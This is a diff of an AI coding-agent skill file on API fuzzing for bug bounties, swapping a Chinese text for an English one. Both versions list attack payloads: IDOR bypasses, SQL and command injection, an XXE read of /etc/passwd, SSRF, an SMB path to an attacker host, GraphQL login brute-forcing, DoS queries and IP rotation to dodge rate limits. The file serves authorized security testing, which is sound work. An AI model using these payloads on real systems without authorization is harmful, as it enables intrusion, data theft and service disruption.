@@ -1,14 +1,14 @@
 ---
 name: api-fuzzing-bug-bounty
-title: REST/GraphQL API 模糊测试与漏洞挖掘
-description: 当在授权的漏洞赏金或渗透测试中需要对 REST/SOAP/GraphQL API 做侦察、模糊测试与越权挖掘时使用；做端点枚举、IDOR/BOLA、注入、鉴权绕过、403 绕过与 GraphQL 内省/批处理攻击并产出可复现 PoC 与漏洞清单；不适用于未授权目标、生产破坏性攻击或前端 UI/业务逻辑测试。触发词：API 模糊测试、IDOR、GraphQL 内省、鉴权绕过、Swagger 枚举、漏洞赏金
+title: API Fuzzing for Bug Bounty
+description: Provide comprehensive techniques for testing REST, SOAP, and GraphQL APIs during bug bounty hunting and penetration testing engagements. Covers vulnerability discovery, authentication bypass, IDOR exploitation, and API-specific attack vectors.
 domain: 安全/appsec
-triggers: [API 模糊测试, REST API 渗透测试, GraphQL 安全测试, IDOR, BOLA 越权, GraphQL 内省 introspection, Swagger/OpenAPI 枚举, API 鉴权绕过, 403/401 绕过, JSON 注入 SQLi, 漏洞赏金 API, Kiterunner API 发现, 批处理速率限制绕过, XXE/SSRF via API]
-tags: [安全, appsec, api安全, 漏洞赏金, 渗透测试, graphql, rest, idor, 模糊测试, 越权, 攻击性安全]
-level: 进阶
+triggers: [IDOR, XXE/SSRF via API]
+tags: [appsec, graphql, rest, idor]
+level: intermediate
 status: stable
 agents: [claude-code, codex, cursor, gemini-cli]
-tools: [Burp Suite, Kiterunner, SecLists, InQL, clairvoyance, graphw00f, GraphCrawler, batchql, graphql-cop, curl, Python, json2paths, Swagger-EZ]
+tools: []
 requires: []
 related: [idor-vulnerability-testing, broken-authentication-testing, ffuf-web-fuzzing, burp-suite-testing]
 combines_with: [burp-suite-testing, red-team-recon, path-traversal-testing]
@@ -16,129 +16,433 @@ license: MIT
 source: sickn33/antigravity-awesome-skills
 source_license: MIT
 ---
-## 何时使用
+> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
 
-在**已获授权**的漏洞赏金或渗透测试中，需要系统性测试 REST、SOAP、GraphQL API 的安全性时使用。覆盖：端点侦察、IDOR/BOLA 越权、各类注入（SQLi/命令/XXE/SSRF）、鉴权绕过、HTTP 方法篡改、403/401 绕过，以及 GraphQL 内省、批处理速率绕过与嵌套 DoS。产物为可复现的越权 PoC、注入点、鉴权绕过手法与漏洞清单。
+# API Fuzzing for Bug Bounty
 
-**仅限授权使用（AUTHORIZED USE ONLY）**：仅可用于授权的安全评估、防御性验证或受控的教育环境。
+## Purpose
 
-不该用的边界：
-- 未获书面授权的目标，或超出 SoW/赏金范围的资产。
-- 生产环境上的破坏性操作（如 DoS、`sleep()` 注入、`limit=9999999999` 等）—— 除非范围明确允许，否则只验证存在性、不打满。
-- 纯前端/UI XSS、纯业务逻辑或客户端测试（用专门的 Web/客户端技能）。
-- 已封装好的合规扫描器一键跑（本技能聚焦手工/半自动深挖）。
+Provide comprehensive techniques for testing REST, SOAP, and GraphQL APIs during bug bounty hunting and penetration testing engagements. Covers vulnerability discovery, authentication bypass, IDOR exploitation, and API-specific attack vectors.
 
-## 步骤
+## Inputs/Prerequisites
 
-1. **侦察与端点枚举**：先判定 API 类型（SOAP=XML、REST=JSON/XML、GraphQL=单端点自定义查询），再找文档与隐藏路由。
-2. **鉴权测试**：分别测 mobile / web / developer API 与各版本（/v1、/v2、/v3），核查速率限制。
-3. **IDOR/BOLA**：遍历对象 ID，尝试多种包装绕过。
-4. **注入测试**：JSON 内 SQLi、命令注入、XXE、SSRF、.NET `Path.Combine` 路径穿越。
-5. **方法与内容类型篡改**：切换 GET/POST/PUT/DELETE/PATCH 与 JSON↔XML。
-6. **GraphQL 专项**：内省、IDOR、注入、批处理绕速率、嵌套 DoS。
-7. **403/401 绕过 + 输出侧利用（PDF 导出 LFI/SSRF）**。
-8. **记录 PoC**：保留请求/响应差异，按风险定级输出清单。
+- Burp Suite or similar proxy tool
+- API wordlists (SecLists, api_wordlist)
+- Understanding of REST/GraphQL/SOAP protocols
+- Python for scripting
+- Target API endpoints and documentation (if available)
 
-## 指令
+## Outputs/Deliverables
 
-侦察（找文档 + 自动发现）：
+- Identified API vulnerabilities
+- IDOR exploitation proofs
+- Authentication bypass techniques
+- SQL injection points
+- Unauthorized data access documentation
+
+---
+
+## API Types Overview
+
+| Type | Protocol | Data Format | Structure |
+|------|----------|-------------|-----------|
+| SOAP | HTTP | XML | Header + Body |
+| REST | HTTP | JSON/XML/URL | Defined endpoints |
+| GraphQL | HTTP | Custom Query | Single endpoint |
+
+---
+
+## Core Workflow
+
+### Step 1: API Reconnaissance
+
+Identify API type and enumerate endpoints:
+
 ```bash
-# 常见 Swagger/OpenAPI 文档路径
-/swagger.json  /openapi.json  /api-docs  /v1/api-docs  /swagger-ui.html
-# Kiterunner 路由发现
+# Check for Swagger/OpenAPI documentation
+/swagger.json
+/openapi.json
+/api-docs
+/v1/api-docs
+/swagger-ui.html
+
+# Use Kiterunner for API discovery
 kr scan https://target.com -w routes-large.kite
-# 从 Swagger 抽取路径
+
+# Extract paths from Swagger
 python3 json2paths.py swagger.json
 ```
-也查 archive.org 历史端点与前端 JS 文件中的接口。
 
-鉴权（分端分版本）：`/api/mobile/login`、`/api/v3/login`、`/api/magic_link`、`/api/admin/login`；逐个核查鉴权端点是否缺速率限制（缺 → 可爆破）。
+### Step 2: Authentication Testing
 
-IDOR/BOLA 与绕过：
 ```bash
-GET /api/users/1234 → GET /api/users/1235      # 基础遍历
-/?user_id=111      # 邮箱式 ID 也试纯数字
-{"id":111} → {"id":[111]}          # 数组包装
-{"id":111} → {"id":{"id":111}}     # JSON 嵌套
-URL?id=<LEGIT>&id=<VICTIM>          # 重复参数
-{"user_id":"*"}                    # 通配
-/api/get_profile?user_id=<victim>&user_id=<legit>   # 参数污染
+# Test different login paths
+/api/mobile/login
+/api/v3/login
+/api/magic_link
+/api/admin/login
+
+# Check rate limiting on auth endpoints
+# If no rate limit → brute force possible
+
+# Test mobile vs web API separately
+# Don't assume same security controls
 ```
 
-JSON 内 SQLi（布尔/时间盲注）：
+### Step 3: IDOR Testing
+
+Insecure Direct Object Reference is the most common API vulnerability:
+
+```bash
+# Basic IDOR
+GET /api/users/1234 → GET /api/users/1235
+
+# Even if ID is email-based, try numeric
+/?user_id=111 instead of /?user_id=user@mail.com
+
+# Test /me/orders vs /user/654321/orders
+```
+
+**IDOR Bypass Techniques:**
+
+```bash
+# Wrap ID in array
+{"id":111} → {"id":[111]}
+
+# JSON wrap
+{"id":111} → {"id":{"id":111}}
+
+# Send ID twice
+URL?id=<LEGIT>&id=<VICTIM>
+
+# Wildcard injection
+{"user_id":"*"}
+
+# Parameter pollution
+/api/get_profile?user_id=<victim>&user_id=<legit>
+{"user_id":<legit_id>,"user_id":<victim_id>}
+```
+
+### Step 4: Injection Testing
+
+**SQL Injection in JSON:**
+
 ```json
-{"id":"56456 AND 1=1#"}        // OK
-{"id":"56456 AND 1=3#"}        // ERROR → 存在注入
-{"id":"56456 AND sleep(15)#"}  // 时间盲注（授权且非生产再用）
+{"id":"56456"}                    → OK
+{"id":"56456 AND 1=1#"}           → OK  
+{"id":"56456 AND 1=2#"}           → OK
+{"id":"56456 AND 1=3#"}           → ERROR (vulnerable!)
+{"id":"56456 AND sleep(15)#"}     → SLEEP 15 SEC
 ```
-命令注入：`?url=Kernel#open → ?url=|ls`；`?name=file.txt;ls%20/`
-XXE：`<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`
-SSRF：`<object data="http://127.0.0.1:8443"/>`
-.NET 路径穿越：`?filename=C:\inetpub\wwwroot\web.config`、`?filename=\\smb.dns.attacker.com\a.png`
 
-方法/内容类型：对同一资源轮测 GET/POST/PUT/DELETE/PATCH；`Content-Type: application/json → application/xml`。
+**Command Injection:**
 
-403/401 绕过（受限时逐个试）：
 ```bash
+# Ruby on Rails
+?url=Kernel#open → ?url=|ls
+
+# Linux command injection
+api.url.com/endpoint?name=file.txt;ls%20/
+```
+
+**XXE Injection:**
+
+```xml
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+```
+
+**SSRF via API:**
+
+```html
+<object data="http://127.0.0.1:8443"/>
+<img src="http://127.0.0.1:445"/>
+```
+
+**.NET Path.Combine Vulnerability:**
+
+```bash
+# If .NET app uses Path.Combine(path_1, path_2)
+# Test for path traversal
+https://example.org/download?filename=a.png
+https://example.org/download?filename=C:\inetpub\wwwroot\web.config
+https://example.org/download?filename=\\smb.dns.attacker.com\a.png
+```
+
+### Step 5: Method Testing
+
+```bash
+# Test all HTTP methods
+GET /api/v1/users/1
+POST /api/v1/users/1
+PUT /api/v1/users/1
+DELETE /api/v1/users/1
+PATCH /api/v1/users/1
+
+# Switch content type
+Content-Type: application/json → application/xml
+```
+
+---
+
+## GraphQL-Specific Testing
+
+### Introspection Query
+
+Fetch entire backend schema:
+
+```graphql
+{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,args{name,type{name,kind}}}}}}
+```
+
+**URL-encoded version:**
+
+```
+/graphql?query={__schema{types{name,kind,description,fields{name}}}}
+```
+
+### GraphQL IDOR
+
+```graphql
+# Try accessing other user IDs
+query {
+  user(id: "OTHER_USER_ID") {
+    email
+    password
+    creditCard
+  }
+}
+```
+
+### GraphQL SQL/NoSQL Injection
+
+```graphql
+mutation {
+  login(input: {
+    email: "test' or 1=1--"
+    password: "password"
+  }) {
+    success
+    jwt
+  }
+}
+```
+
+### Rate Limit Bypass (Batching)
+
+```graphql
+mutation {login(input:{email:"a@example.com" password:"password"}){success jwt}}
+mutation {login(input:{email:"b@example.com" password:"password"}){success jwt}}
+mutation {login(input:{email:"c@example.com" password:"password"}){success jwt}}
+```
+
+### GraphQL DoS (Nested Queries)
+
+```graphql
+query {
+  posts {
+    comments {
+      user {
+        posts {
+          comments {
+            user {
+              posts { ... }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+
+### GraphQL XSS
+
+```bash
+# XSS via GraphQL endpoint
+http://target.com/graphql?query={user(name:"<script>alert(1)</script>"){id}}
+
+# URL-encoded XSS
+http://target.com/example?id=%C/script%E%Cscript%Ealert('XSS')%C/script%E
+```
+
+### GraphQL Tools
+
+| Tool | Purpose |
+|------|---------|
+| GraphCrawler | Schema discovery |
+| graphw00f | Fingerprinting |
+| clairvoyance | Schema reconstruction |
+| InQL | Burp extension |
+| GraphQLmap | Exploitation |
+
+---
+
+## Endpoint Bypass Techniques
+
+When receiving 403/401, try these bypasses:
+
+```bash
+# Original blocked request
+/api/v1/users/sensitivedata → 403
+
+# Bypass attempts
 /api/v1/users/sensitivedata.json
-/api/v1/users/sensitivedata/       /api/v1/users/sensitivedata%20
-/api/v1/users/sensitivedata%09     /api/v1/users/sensitivedata#
+/api/v1/users/sensitivedata?
+/api/v1/users/sensitivedata/
+/api/v1/users/sensitivedata??
+/api/v1/users/sensitivedata%20
+/api/v1/users/sensitivedata%09
+/api/v1/users/sensitivedata#
 /api/v1/users/sensitivedata&details
 /api/v1/users/..;/sensitivedata
 ```
 
-GraphQL 专项：
-```graphql
-# 内省拉取完整 schema
-{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,args{name,type{name,kind}}}}}}
-# IDOR：换其他用户 ID 取敏感字段
-query { user(id:"OTHER_USER_ID"){ email password creditCard } }
-# 注入
-mutation { login(input:{email:"test' or 1=1--" password:"password"}){ success jwt } }
-# 批处理绕速率限制（一次请求多条 mutation）
-mutation {login(input:{email:"a@x.com" password:"p"}){success jwt}}
-mutation {login(input:{email:"b@x.com" password:"p"}){success jwt}}
+---
+
+## Output Exploitation
+
+### PDF Export Attacks
+
+```html
+<!-- LFI via PDF export -->
+<iframe src="file:///etc/passwd" height=1000 width=800>
+
+<!-- SSRF via PDF export -->
+<object data="http://127.0.0.1:8443"/>
+
+<!-- Port scanning -->
+<img src="http://127.0.0.1:445"/>
+
+<!-- IP disclosure -->
+<img src="https://iplogger.com/yourcode.gif"/>
 ```
-内省关闭时用 clairvoyance 重建 schema；指纹用 graphw00f，发现用 GraphCrawler / InQL，批处理与 DoS 检测用 batchql / graphql-cop。嵌套查询 DoS（posts→comments→user→posts… 递归）仅在授权且范围允许时验证。
 
-输出侧利用（PDF/报表导出渲染 HTML 时）：`<iframe src="file:///etc/passwd">`（LFI）、`<object data="http://127.0.0.1:8443"/>`（SSRF）、`<img src="https://iplogger.com/...">`（IP 泄露）。
+### DoS via Limits
 
-## 示例
-
-例 1 — IDOR：携带自己 token，仅改对象 ID，观察是否返回他人数据。
 ```bash
-GET /api/v1/invoices/12345   Authorization: Bearer <token>   # 自己
-GET /api/v1/invoices/12346   Authorization: Bearer <token>   # 返回他人发票 → IDOR
+# Normal request
+/api/news?limit=100
+
+# DoS attempt
+/api/news?limit=9999999999
 ```
 
-例 2 — GraphQL 内省（curl）：
+---
+
+## Common API Vulnerabilities Checklist
+
+| Vulnerability | Description |
+|---------------|-------------|
+| API Exposure | Unprotected endpoints exposed publicly |
+| Misconfigured Caching | Sensitive data cached incorrectly |
+| Exposed Tokens | API keys/tokens in responses or URLs |
+| JWT Weaknesses | Weak signing, no expiration, algorithm confusion |
+| IDOR / BOLA | Broken Object Level Authorization |
+| Undocumented Endpoints | Hidden admin/debug endpoints |
+| Different Versions | Security gaps in older API versions |
+| Rate Limiting | Missing or bypassable rate limits |
+| Race Conditions | TOCTOU vulnerabilities |
+| XXE Injection | XML parser exploitation |
+| Content Type Issues | Switching between JSON/XML |
+| HTTP Method Tampering | GET→DELETE/PUT abuse |
+
+---
+
+## Quick Reference
+
+| Vulnerability | Test Payload | Risk |
+|---------------|--------------|------|
+| IDOR | Change user_id parameter | High |
+| SQLi | `' OR 1=1--` in JSON | Critical |
+| Command Injection | `; ls /` | Critical |
+| XXE | DOCTYPE with ENTITY | High |
+| SSRF | Internal IP in params | High |
+| Rate Limit Bypass | Batch requests | Medium |
+| Method Tampering | GET→DELETE | High |
+
+---
+
+## Tools Reference
+
+| Category | Tool | URL |
+|----------|------|-----|
+| API Fuzzing | Fuzzapi | github.com/Fuzzapi/fuzzapi |
+| API Fuzzing | API-fuzzer | github.com/Fuzzapi/API-fuzzer |
+| API Fuzzing | Astra | github.com/flipkart-incubator/Astra |
+| API Security | apicheck | github.com/BBVA/apicheck |
+| API Discovery | Kiterunner | github.com/assetnote/kiterunner |
+| API Discovery | openapi_security_scanner | github.com/ngalongc/openapi_security_scanner |
+| API Toolkit | APIKit | github.com/API-Security/APIKit |
+| API Keys | API Guesser | api-guesser.netlify.app |
+| GUID | GUID Guesser | gist.github.com/DanaEpp/8c6803e542f094da5c4079622f9b4d18 |
+| GraphQL | InQL | github.com/doyensec/inql |
+| GraphQL | GraphCrawler | github.com/gsmith257-cyber/GraphCrawler |
+| GraphQL | graphw00f | github.com/dolevf/graphw00f |
+| GraphQL | clairvoyance | github.com/nikitastupin/clairvoyance |
+| GraphQL | batchql | github.com/assetnote/batchql |
+| GraphQL | graphql-cop | github.com/dolevf/graphql-cop |
+| Wordlists | SecLists | github.com/danielmiessler/SecLists |
+| Swagger Parser | Swagger-EZ | rhinosecuritylabs.github.io/Swagger-EZ |
+| Swagger Routes | swagroutes | github.com/amalmurali47/swagroutes |
+| API Mindmap | MindAPI | dsopas.github.io/MindAPI/play |
+| JSON Paths | json2paths | github.com/s0md3v/dump/tree/master/json2paths |
+
+---
+
+## Constraints
+
+**Must:**
+- Test mobile, web, and developer APIs separately
+- Check all API versions (/v1, /v2, /v3)
+- Validate both authenticated and unauthenticated access
+
+**Must Not:**
+- Assume same security controls across API versions
+- Skip testing undocumented endpoints
+- Ignore rate limiting checks
+
+**Should:**
+- Add `X-Requested-With: XMLHttpRequest` header to simulate frontend
+- Check archive.org for historical API endpoints
+- Test for race conditions on sensitive operations
+
+---
+
+## Examples
+
+### Example 1: IDOR Exploitation
+
+```bash
+# Original request (own data)
+GET /api/v1/invoices/12345
+Authorization: Bearer <token>
+
+# Modified request (other user's data)
+GET /api/v1/invoices/12346
+Authorization: Bearer <token>
+
+# Response reveals other user's invoice data
+```
+
+### Example 2: GraphQL Introspection
+
 ```bash
 curl -X POST https://target.com/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{__schema{types{name,fields{name}}}}"}'
 ```
 
-## 注意事项
-
-约束（Must）：mobile/web/developer API 分开测；测全所有版本 /v1 /v2 /v3；分别验证已认证与未认证访问。
-
-禁止（Must Not）：假定各版本/各端口安全控制一致；跳过未公开端点；忽略速率限制核查。
-
-建议（Should）：加 `X-Requested-With: XMLHttpRequest` 头模拟前端调用；查 archive.org 历史端点；对敏感操作测竞态条件（TOCTOU）。
-
-常见排障：
-- 接口无返回 → 加 `X-Requested-With: XMLHttpRequest`。
-- 全端点 401 → 试附加 `?user_id=1`。
-- GraphQL 内省被禁 → 用 clairvoyance 重建。
-- 被限速 → IP 轮换或批处理请求。
-- 找不到端点 → 查 Swagger、archive.org、前端 JS。
-
-漏洞速查（IDOR/BOLA、JWT 弱点、Token 泄露、缓存配置错误、未公开端点、旧版本差异、速率缺失、竞态、XXE、内容类型切换、方法篡改）逐项过一遍。破坏性 payload（`sleep`、超大 `limit`、嵌套 DoS）务必先确认范围允许再用。
-
-## 互见
-
-- 同域可配合：Web 注入（SQLi/命令/XXE/SSRF 深挖）、JWT/鉴权安全、SSRF 利用链等 appsec 技能。
-- 词表与工具：SecLists、Kiterunner、Swagger-EZ、MindAPI、json2paths。
-
 ---
-采编自 sickn33/antigravity-awesome-skills（原作者 zebbern，MIT 许可）。
+
+## Troubleshooting
+
+| Issue | Solution |
+|-------|----------|
+| API returns nothing | Add `X-Requested-With: XMLHttpRequest` header |
+| 401 on all endpoints | Try adding `?user_id=1` parameter |
+| GraphQL introspection disabled | Use clairvoyance for schema reconstruction |
+| Rate limited | Use IP rotation or batch requests |
+| Can't find endpoints | Check Swagger, archive.org, JS files |
+
+## When to Use
+This skill is applicable to execute the workflow or actions described in the overview.
